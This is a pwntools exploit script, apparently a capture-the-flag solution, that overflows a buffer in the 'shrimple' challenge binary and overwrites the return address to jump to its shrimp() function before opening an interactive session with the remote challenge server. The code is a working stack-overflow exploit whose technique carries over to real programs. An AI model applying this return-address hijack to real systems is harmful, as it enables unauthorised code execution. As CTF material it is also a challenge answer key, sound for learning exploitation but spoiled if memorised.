from pwn import *

# Set up pwntools for the correct architecture (64-bit)
context.update(arch='amd64', os='linux')
#context.update(arch='sparc', os='linux') #o tym pamietac jak sie nie pobiera danych z pliku

# Set to ELF of the binary file
binary = './shrimple'  # Adjust this to your actual binary name
elf = ELF(binary)

# GDB script to attach GDB/GEF to the process
gdbscript = """
init-gef
continue
"""

# Start the binary locally
#io = process(binary)
# Start the binary in a process (or remote if applicable)
io = remote("chal.competitivecyber.club", 8884)
# If you want to start GDB directly:
#io = gdb.debug(binary, gdbscript=gdbscript)

# Craft the payload
rop = ROP(elf)

RET = rop.find_gadget(['ret'])[0]

# Address of shrimp() function
shrimp_addr = p64(elf.symbols['shrimp']+5)  # The address of shrimp() in little-endian

# Overflow buffer with 37 bytes to hit return address
payload = b"A"*28 + b"B"*8 + b"C"*2
# Send the payload
io.recvuntil(">> ")
io.send(payload + b"D"*4 + b"\n")
sleep(0.5)
io.recvuntil(">> ")
io.send(payload + b"D"*3 + b"\n")
sleep(0.5)
io.recvuntil(">> ")
io.send(payload + shrimp_addr + b"\n")
sleep(0.5)
io.interactive()
